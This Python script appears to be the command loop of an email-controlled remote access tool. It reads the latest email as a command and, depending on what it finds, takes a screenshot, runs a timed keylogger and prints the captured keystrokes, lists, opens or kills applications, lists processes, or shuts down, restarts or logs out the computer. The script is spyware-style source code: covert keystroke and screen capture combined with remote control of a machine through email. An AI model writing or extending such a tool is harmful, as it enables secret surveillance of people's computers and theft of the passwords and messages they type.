import EmailHandler as em
import KeyLogger as keyl
import ListApp as app
import ListProcess as proc
import ScreenShot
import Power
import time
import os

DEFAULT_KEYLOG_TIME = 5

# init
email = em.EmailHandler()
waitCounter = 0
idler = ['   ', '.  ', '.. ', '...']
# Main loop
while True:
    
    command = email.readLastestEmail()
    cmd = command[1].split()

    print(f'Waiting for next command{idler[waitCounter]}\r', end='')
    waitCounter = 0 if waitCounter == 3 else waitCounter + 1 

    if 'EMPTY' in cmd:
        continue
    os.system('cls')

    if cmd[0] == 'screenshot':
        ScreenShot.capture()

    elif cmd[0] == 'keylog':
        keylTime = DEFAULT_KEYLOG_TIME
        if '-t' in cmd:
            keylTime = int(cmd[cmd.index('-t') + 1])
        keylog = keyl.Keylogger(keylTime)
        keys = keylog.run()
        print('Finished')
        if '-both' in cmd:
            for i in keys:
                print(f'{i}: {keys[i]}')
            print(f'Log: {keylog.getLog()}')
        elif '-l' in cmd:
            print(f'Log: {keylog.getLog()}')
        else:
            for i in keys:
                print(f'{i}: {keys[i]}')


    elif cmd[0] == 'app':
        if cmd[1] == 'list':
            appList = app.ListApp('-path' in cmd)
            for i in appList:
                print(i)
        elif cmd[1] == '-end':
            app.StopApp(cmd[2])
        else:
            app.OpenApp(cmd[2])

    elif cmd[0] == 'proc':
        if cmd[1] == 'list':
            procList = proc.ListGet()
            for i in procList:
                print(f'{i[0]:<10}{i[1]}')

    elif cmd[0] == 'shutdown':
        Power.shutdown()
    
    elif cmd[0] == 'restart':
        Power.restart()
    
    elif cmd[0] == 'logout':
        Power.logout()

    else:
        print('Error: Command not found')

    time.sleep(1)
    

